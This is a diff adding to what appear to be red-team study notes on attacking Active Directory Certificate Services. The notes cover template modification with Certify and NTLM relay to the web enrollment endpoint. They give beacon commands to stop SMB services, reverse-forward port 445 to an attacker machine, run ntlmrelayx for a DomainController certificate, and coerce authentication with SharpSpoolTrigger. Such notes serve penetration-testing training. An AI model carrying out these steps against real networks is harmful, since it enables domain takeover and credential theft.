@@ -54,5 +54,40 @@ enumeration using certify
             grant yourself enrollment rights using --enroll [SID]
             toggle manager approval using --manager-approval, and set signatures needed to 0 using --authorized-signature 0
             toggle EKUs that allow client authentication, --client-auth, --pkinit-auth, or --smartcard-login
-            toggle the ENROLLEE_SUPPLIES_SUBJECT
-        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
+            toggle the ENROLLEE_SUPPLIES_SUBJECT flag using --supply-subject
+                ex. beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
+        now we can mimic the attack #1
+    
+5. NTLM relay to ADCS HTTP Endpoints
+    CAs can be configured with web enrollment services that allows users to request certs via the web
+    if not hosted over HTTPS with channel binding, the endpoints are vulnerable to NTLM relaying
+    this endpoint is typically located at http[s]://<ca>/certsrv
+    enumeration:
+        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
+            looking for support for HTTP web enrollment without channel binding
+    exploitation:
+        relaying over a C2 is complex as we don't have easy control of port 445
+        to achieve relaying with C2 we must...
+            unbind port 445 on compromised machine
+            NOTE: unbinding port 445 will break every SMB service (incl. smb beacons!), so be careful! do not do this on a machine where smb is critical
+                verify that 445 is in use
+                    beacon> netstat
+                stop the process lanmanserver, srv2, then srvnet
+                    reconfigure lanmanserver so it doesn't restart automatically
+                        beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
+                    now stop each service
+                        beacon> sc_stop lanmanserver
+                        beacon> sc_stop srv2
+                        beacon> sc_stop srvnet
+            start a reverse port forward on 445 to tunnel incoming NTLM auth reqs to our attacker machine
+                set up a reverse port forward to our local machine on port 7445
+                NOTE: inbound traffic on 445 may be blocked, we can temporarily create a firewall rule to allow it if needed
+                    beacon> rportfwd_local 445 localhost 7445
+            run a socks proxy for ntlmrelayx to forward the reqs back to the ADCS HTTP endpoint
+                beacon> socks 1080 socks5
+            run ntlmrelayx on our attacker machine to catch the NTLM reqs
+                └─# proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+            now we just need to coerce authentication
+                beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
+            once the ntlm req tunnels to ntlmrelayx, it will relay it back through socks proxy to request the cert, download it, and save in PFX format
+            this cert can be used to obtain a TGT, then we can perform a S42Uself to obtain service tickets
